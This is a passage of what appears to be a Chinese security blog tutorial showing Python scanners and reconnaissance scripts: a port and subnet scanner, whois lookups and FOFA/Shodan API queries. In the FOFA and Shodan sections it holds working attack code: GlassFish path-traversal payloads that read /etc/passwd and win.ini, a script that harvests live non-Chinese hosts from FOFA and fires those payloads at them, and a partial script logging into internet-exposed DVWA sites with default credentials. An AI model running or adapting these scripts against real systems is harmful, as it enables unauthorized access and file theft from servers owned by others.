class="hljs-comment">#端口扫描</span><br>                <span class="hljs-keyword">if</span> args.portScan:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;target:&quot;</span>+ip)<br>                    <span class="hljs-keyword">if</span> args.all_port:<br>                        <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">65536</span>):<br>                            <span class="hljs-keyword">if</span> is_port_open(ip,p):<br>                                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] &quot;</span>+ip+<span class="hljs-string">&quot;:&quot;</span>+<span class="hljs-built_in">str</span>(p)+<span class="hljs-string">&quot; is open!&quot;</span>)<br>                            <span class="hljs-keyword">else</span>:<br>                                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[-] &quot;</span>+ip+<span class="hljs-string">&quot;:&quot;</span>+<span class="hljs-built_in">str</span>(p)+<span class="hljs-string">&quot; is not open!&quot;</span>)<br>                    <span class="hljs-keyword">else</span>:<br>                        <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> common_port:<br>                            <span class="hljs-comment">#print(p)</span><br>                            <span class="hljs-keyword">if</span> is_port_open(ip,p):<br>                                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] &quot;</span>+ip+<span class="hljs-string">&quot;:&quot;</span>+<span class="hljs-built_in">str</span>(p)+<span class="hljs-string">&quot; is open!&quot;</span>)<br>                            <span class="hljs-keyword">else</span>:<br>                                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[-] &quot;</span>+ip+<span class="hljs-string">&quot;:&quot;</span>+<span class="hljs-built_in">str</span>(p)+<span class="hljs-string">&quot; is not open!&quot;</span>)<br>                <span class="hljs-comment">#C段扫描</span><br>                <span class="hljs-keyword">elif</span> args.CduanScan:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;target:&quot;</span>+ip)<br>                    <span class="hljs-comment">#执行ping命令</span><br>                    check_ping = Popen(<span class="hljs-string">&quot;ping &#123;0&#125; \n&quot;</span>.<span class="hljs-built_in">format</span>(ip),stdin=PIPE,stdout=PIPE,shell=<span class="hljs-literal">True</span>)<br>                    data = check_ping.stdout.read()<br>                    <br>                    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;TTL&quot;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>(data):<br>                        <span class="hljs-built_in">print</span>(ip+<span class="hljs-string">&quot; is up!&quot;</span>)<br>                        <span class="hljs-comment">#判断是否两者一起</span><br>                        <span class="hljs-keyword">if</span> args.all_scan:<br>                            <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> common_port:<br>                                <span class="hljs-keyword">if</span> is_port_open(ip,p):<br>                                    <span class="hljs-comment">#数据要转为str</span><br>                                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*] &#x27;</span>+ip+<span class="hljs-string">&#x27;:&#x27;</span>+<span class="hljs-built_in">str</span>(p)+<span class="hljs-string">&quot; is open!&quot;</span>)<br>                                <span class="hljs-keyword">else</span>:<br>                                    <span class="hljs-keyword">pass</span><br>                    <span class="hljs-keyword">else</span>:<br>                        <span class="hljs-built_in">print</span>(ip+<span class="hljs-string">&quot; 不在线 \n&quot;</span>)<br>            <span class="hljs-keyword">except</span>:<br>                <span class="hljs-keyword">pass</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">start</span>(<span class="hljs-params">count,args</span>):<br>    queue = Queue()<br>    <span class="hljs-comment">#根据命令行参数来判断传入队列的ip信息</span><br>    <span class="hljs-keyword">if</span> args.portScan:<br>        queue.put(args.target)<br>    <span class="hljs-keyword">elif</span> args.CduanScan:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">255</span>):<br>            queue.put(args.target+<span class="hljs-string">&#x27;.&#x27;</span>+<span class="hljs-built_in">str</span>(i))<br>        <br>    <span class="hljs-comment">#多线程</span><br>    threads = []<br>    thread_count = <span class="hljs-built_in">int</span>(count)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(thread_count):<br>        threads.append(pScan(queue,args))<br>    <span class="hljs-comment">#开启线程</span><br>    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:<br>        t.start()<br>    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:<br>        t.join()<br><br><span class="hljs-comment">#脚本参数</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">setParser</span>():<br>    parser = ArgumentParser(<br>        prog = <span class="hljs-string">&quot;端口+C段扫描器&quot;</span>,<br>        description = <span class="hljs-string">&quot;r1&#x27;s tool&quot;</span><br>    )<br><br>    <span class="hljs-comment">#定义命令行参数</span><br>    parser.add_argument(<span class="hljs-string">&quot;-c&quot;</span>,<span class="hljs-string">&quot;--CduanScan&quot;</span>,<span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;仅扫描C段&quot;</span>,action=<span class="hljs-string">&quot;store_true&quot;</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;-p&quot;</span>,<span class="hljs-string">&quot;--portScan&quot;</span>,<span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;仅扫描端口（默认使用常用端口号）&quot;</span>,action=<span class="hljs-string">&quot;store_true&quot;</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;-t&quot;</span>,<span class="hljs-string">&quot;--target&quot;</span>,default=<span class="hljs-number">0</span>,<span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;指定目标&quot;</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;-a&quot;</span>,<span class="hljs-string">&quot;--all_scan&quot;</span>,<span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;扫描输入的ip段的C段和存活ip的端口开放情况（默认使用常用端口号）&quot;</span>,action=<span class="hljs-string">&quot;store_true&quot;</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;-ap&quot;</span>,<span class="hljs-string">&quot;--all_port&quot;</span>,action=<span class="hljs-string">&quot;store_true&quot;</span>,<span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;全端口扫描&quot;</span>)<br>    <span class="hljs-keyword">return</span> parser.parse_args()<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    args = setParser()<br>    <span class="hljs-keyword">if</span> args.target:<br>        start(<span class="hljs-number">16</span>,args)<br><br></code></pre></td></tr></table></figure><p><img src="/img/image-20230922164531423.png" alt="image-20230922164531423"></p><p>C段扫描：</p><img src="/img/image-20230922165237281.png" alt="image-20230922165237281" style="zoom:67%;" /><p>端口扫描：</p><img src="/img/image-20230922170227265.png" alt="image-20230922170227265" style="zoom:67%;" /><p>扫C段并且扫描存活主机的端口：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python .\pScanV2<span class="hljs-selector-class">.py</span> -t xxx -<span class="hljs-selector-tag">a</span> -c<br></code></pre></td></tr></table></figure><h2 id="whois信息收集"><a href="#whois信息收集" class="headerlink" title="whois信息收集"></a>whois信息收集</h2><p>思路：</p><p>1.判断此域名是否存在   </p><p>2.使用whois命令（pip install python-whois）或者调用网站(<a href="https://whois.chinaz.com/)%E6%9D%A5%E6%9F%A5%E8%AF%A2">https://whois.chinaz.com/)来查询</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">import</span> whois<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_registered</span>(<span class="hljs-params">domain_name</span>):<br>    <span class="hljs-keyword">try</span>:<br>        w = whois.whois(domain_name)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">bool</span>(w.domain_name)<br>    <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    dms = [<br>        <span class="hljs-string">&#x27;baidu.com&#x27;</span>,<br>        <span class="hljs-string">&#x27;zhihu.com&#x27;</span>,<br>        <span class="hljs-string">&#x27;sadasdnjkbgadklbgads.com&#x27;</span><br>    ]<br>    <span class="hljs-keyword">for</span> dm <span class="hljs-keyword">in</span> dms:<br>        <span class="hljs-built_in">print</span>(dm,<span class="hljs-string">&quot; is registered&quot;</span> <span class="hljs-keyword">if</span> is_registered(dm) <span class="hljs-keyword">else</span> <span class="hljs-string">&quot; is not registered&quot;</span>)<br>        <br>        <br><span class="hljs-comment">#模块化：        </span><br><span class="hljs-keyword">import</span> whois<br><span class="hljs-keyword">from</span> validate_domains <span class="hljs-keyword">import</span> is_registered<br><br>domain_name = <span class="hljs-string">&quot;baidu.com&quot;</span><br><br><span class="hljs-keyword">if</span> is_registered(domain_name):<br>    whois_info = whois.whois(domain_name)<br>    <span class="hljs-built_in">print</span>(whois_info)<br>    <br></code></pre></td></tr></table></figure><h2 id="fofaAPI的使用"><a href="#fofaAPI的使用" class="headerlink" title="fofaAPI的使用"></a>fofaAPI的使用</h2><p>API接口文档：<a href="https://fofa.info/api">https://fofa.info/api</a></p><ul><li>普通查询</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">curl -X GET <span class="hljs-string">&quot;https://fofa.info/api/v1/search/all?email=xxx&amp;key=xxx&amp;qbase64=xxx&quot;</span><br><br><span class="hljs-comment">#python方式：</span><br><span class="hljs-keyword">import</span> requests<br>url = <span class="hljs-string">&quot;https://fofa.info/api/v1/search/all?email=your_email&amp;key=fofa_api&amp;qbase64=query_sentence&quot;</span><br><br>res = requests.get(url)<br><span class="hljs-built_in">print</span>(res.text)<br><br></code></pre></td></tr></table></figure><ul><li>host聚合</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">https://fofa.info/api/v1/host/<span class="hljs-number">103.41</span><span class="hljs-number">.167</span><span class="hljs-number">.234</span>?email=your_email&amp;key=your_key<br><br><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;https://fofa.info/api/v1/host/xxx.xxx.xxx.xxx?email=xxx&amp;key=xxx&quot;</span><br><br>res = requests.get(url)<br><span class="hljs-built_in">print</span>(res.text)<br></code></pre></td></tr></table></figure><p><img src="/img/image-20230922210843955.png" alt="image-20230922210843955"></p><p><img src="/img/image-20230914112126185.png" alt="image-20230914112126185"></p><ul><li>sdk</li></ul><p><a href="https://github.com/fofapro/fofa-py">https://github.com/fofapro/fofa-py</a></p><p>下载解压  该目录下执行python .&#x2F;setup.py install</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">import</span> fofa<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    email, key = (<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)  <span class="hljs-comment"># 输入email和key</span><br>    client = fofa.Client(email, key)                <span class="hljs-comment"># 将email和key传入fofa.Client类进行初始化和验证，并得到一个fofa client对象</span><br>    query_str = <span class="hljs-string">&#x27;header=&quot;thinkphp&quot; || header=&quot;think_template&quot;&#x27;</span><br>    <span class="hljs-keyword">for</span> page <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">51</span>):                       <span class="hljs-comment"># 从第1页查到第50页</span><br>        <span class="hljs-comment"># fpoint = client.get_userinfo()[&quot;fofa_point&quot;]      # 查询F点剩余数量</span><br>        <span class="hljs-comment"># if fpoint &lt; 100:</span><br>        <span class="hljs-comment">#     break                                   # 当F点小于100时，不再获取数据</span><br>        <span class="hljs-keyword">try</span>:<br>            data = client.search(query_str, size=<span class="hljs-number">100</span>, page=page, fields=<span class="hljs-string">&quot;ip,city&quot;</span>)  <span class="hljs-comment"># 查询第page页数据的ip和城市</span><br>            <span class="hljs-keyword">for</span> ip, city <span class="hljs-keyword">in</span> data[<span class="hljs-string">&quot;results&quot;</span>]:<br>                <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;%s,%s&quot;</span>%(ip,city))             <span class="hljs-comment"># 打印出每条数据的ip和城市</span><br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;账号信息错误&quot;</span>)<br></code></pre></td></tr></table></figure><h3 id="fofa实战"><a href="#fofa实战" class="headerlink" title="fofa实战"></a>fofa实战</h3><p>例子：<a href="https://www.secpulse.com/archives/42277.html">https://www.secpulse.com/archives/42277.html</a>  应用服务器glassfish任意文件读取漏洞</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sas">FOFA语法：<span class="hljs-string">&quot;glassfish&quot;</span> <span class="hljs-variable">&amp;&amp;</span> port=<span class="hljs-string">&quot;4848&quot;</span> <span class="hljs-variable">&amp;&amp;</span> country!=<span class="hljs-string">&quot;CN&quot;</span><br>linuxPOC:http://localhost:4848/theme/META-INF/<span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span><span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span>/<span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span><span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span>/<span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span><span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span>/<span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span><span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span>/<span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span><span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span>/<span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span><span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span>/<span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span><span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span>/<span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span><span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span>/<span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span><span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span>/<span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span><span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span>/etc/passwd<br><br>windowsPOC:http://localhost:4848/theme/META-INF/<span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span><span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span>/<span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span><span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span>/<span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span><span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span>/<span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span><span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span>/<span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span><span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span>/<span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span><span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span>/<span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span><span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span>/<span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span><span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span>/<span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span><span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span>/<span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span><span class="hljs-title function_">%c0</span><span class="hljs-title function_">%ae</span>/windows/win.ini<br><br></code></pre></td></tr></table></figure><img src="/img/image-20230915100934734.png" alt="image-20230915100934734" style="zoom:67%;" /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment">#在sdk里执行</span><br><span class="hljs-keyword">import</span> fofa<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-comment">#定义漏洞列表</span><br>vul_ips = []<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_vuln</span>(<span class="hljs-params">ips</span>):<br>    linux_POC = <span class="hljs-string">&#x27;/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd&#x27;</span><br>    windows_POC = <span class="hljs-string">&#x27;/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini&#x27;</span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> ips:<br>        ip = i.replace(<span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)    <span class="hljs-comment">#换行替换为空</span><br>        windows_url = <span class="hljs-string">&quot;http://&quot;</span>+ip+<span class="hljs-string">&quot;:4848&quot;</span>+windows_POC<br>        linux_url = <span class="hljs-string">&quot;http://&quot;</span>+ip+<span class="hljs-string">&quot;:4848&quot;</span>+linux_POC<br><br>        <span class="hljs-keyword">try</span>:<br>            vuln_code_linux = requests.get(linux_url).status_code<br>            vuln_code_windows = requests.get(windows_url).status_code<br>            <span class="hljs-keyword">if</span> vuln_code_linux == <span class="hljs-number">200</span> <span class="hljs-keyword">or</span> vuln_code_windows == <span class="hljs-number">200</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] ip:&quot;</span>+ip+<span class="hljs-string">&quot;存在glassfish任意文件读取漏洞&quot;</span>)<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    email, key = (<span class="hljs-string">&#x27;xxx&#x27;</span>, <span class="hljs-string">&#x27;xxxx&#x27;</span>)  <span class="hljs-comment"># 输入email和key</span><br>    client = fofa.Client(email, key)                <span class="hljs-comment"># 将email和key传入fofa.Client类进行初始化和验证，并得到一个fofa client对象</span><br>    query_str = <span class="hljs-string">&#x27;&quot;glassfish&quot; &amp;&amp; port=&quot;4848&quot; &amp;&amp; country!=&quot;CN&quot;&#x27;</span><br>    <br><br>    <span class="hljs-keyword">for</span> page <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">3</span>):                       <span class="hljs-comment"># 从第1页查到第x页</span><br>        <span class="hljs-comment"># fpoint = client.get_userinfo()[&quot;fofa_point&quot;]      # 查询F点剩余数量</span><br>        <span class="hljs-comment"># if fpoint &lt; 100:</span><br>        <span class="hljs-comment">#     break                                   # 当F点小于100时，不再获取数据</span><br>        <span class="hljs-keyword">try</span>:<br>            data = client.search(query_str, size=<span class="hljs-number">10</span>, page=page, fields=<span class="hljs-string">&quot;ip&quot;</span>)  <span class="hljs-comment"># 查询第page页数据的ip</span><br>            <span class="hljs-keyword">for</span> ip <span class="hljs-keyword">in</span> data[<span class="hljs-string">&quot;results&quot;</span>]:<br>                <span class="hljs-comment">#print (ip)             # 打印出每条数据的ip</span><br>                vul_ips.append(ip)<br>                <span class="hljs-comment">#print(vul_ips)</span><br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;账号信息错误&quot;</span>)<br><br>check_vuln(vul_ips)<br></code></pre></td></tr></table></figure><h2 id="shodan实战"><a href="#shodan实战" class="headerlink" title="shodan实战"></a>shodan实战</h2><h3 id="shodan-python脚本文档"><a href="#shodan-python脚本文档" class="headerlink" title="shodan  python脚本文档"></a>shodan  python脚本文档</h3><p><a href="https://shodan.readthedocs.io/en/latest/">https://shodan.readthedocs.io/en/latest/</a></p><p><a href="https://github.com/achillean/shodan-python">https://github.com/achillean/shodan-python</a></p><p>以dvwa靶场为例</p><p>默认用户名密码：admin:password</p><p>思路：</p><p>1.使用shodan搜索dvwa  title:dvwa</p><p>2.使用默认用户密码+网页源码中的usertoken进行登录</p><img src="/img/image-20230915110636012.png" alt="image-20230915110636012" style="zoom: 67%;" /><p>post 登录语句:username&#x3D;admin&amp;password&#x3D;password&amp;Login&#x3D;Login&amp;user_token&#x3D;{token}</p><p>登录成功–302</p><p><img src="/img/image-20230915154636049.png" alt="image-20230915154636049"></p><p>Shodan.search()方法的返回值：</p><p><img src="/img/image-20230915183258357.png" alt="image-20230915183258357"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">import</span> shodan<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><br><span class="hljs-comment">#shodankey</span><br>SHODAN_API_KEY = <span class="hljs-string">&quot;xxxx&quot;</span><br>api = shodan.Shodan(SHODAN_API_KEY)<br><br><br><span class="hljs-comment">#shodan搜索   返回第几页的搜索结果</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">request_shodan_api</span>(<span class="hljs-params">query,page=<span class="hljs-number">1</span></span>):<br>    <span class="hljs-comment"># Wrap the request in a try/ except block to catch errors</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-comment"># Search Shodan</span><br>            instances = api.search(query,page=page)<br><br>            <span class="hljs-comment"># Show the results</span><br>            <span class="hljs-comment"># print(&#x27;Results found: &#123;&#125;&#x27;.format(results[&#x27;total&#x27;]))</span><br>            <span class="hljs-comment"># for result in results[&#x27;matches&#x27;]:</span><br>            <span class="hljs-comment">#         print(&#x27;IP: &#123;&#125;&#x27;.format(result[&#x27;ip_str&#x27;]))</span><br>            <span class="hljs-comment">#         #print(result[&#x27;data&#x27;])</span><br>            <span class="hljs-comment">#         #print(&#x27;&#x27;)</span><br>            <span class="hljs-keyword">return</span> instances    <span class="hljs-comment">#返回搜索结果</span><br><br>        <span class="hljs-keyword">except</span> shodan.APIError <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Error: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(e))<br>            time.sleep(<span class="hljs-number">5</span>)<br><br><span class="hljs-comment">#向目标网站发送请求  登录</span><br><span class="hljs-comment">#result为Shodan.search()方法的返回值中的matches字段的数据</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login_ip</span>(<span class="hljs-params">results</span>):<br>    <span class="hljs-comment">#判断协议是http还是https</span><br>    proto = (<span class="hljs-string">&#x27;ssl&#x27;</span> <span class="hljs-keyword">in</span> results) <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;https&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;http&#x27;</span><br>    <span class="hljs-comment">#发起请求</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment">#print(f&quot;&#123;proto&#125;://&#123;results[&#x27;ip_str&#x27;]&#125;:&#123;results[&#x27;port&#x27;]&#125;/login.php&quot;)</span><br>        res = requests.get(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;proto&#125;</span>://<span class="hljs-subst">&#123;results[<span class="hljs-string">&#x27;ip_str&#x27;</span>]&#125;</span>:<span class="hljs-subst">&#123;results[<span class="hljs-string">&#x27;port&#x27;</span>]&#125;</span>/login.php&quot;</span>,verify=<span class="hljs-literal">False</span>)<br>    <span class="hljs-keyword">except</span> requests.exceptions.ConnectionError:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">if</span> res.status_code != <span class="hljs-number">200</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;目标不存在dvwa&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-comment">#获取token  发送post请求登录</span><br>    <span class="hljs-comment">#token = re.search(r&quot;user_token&#x27; 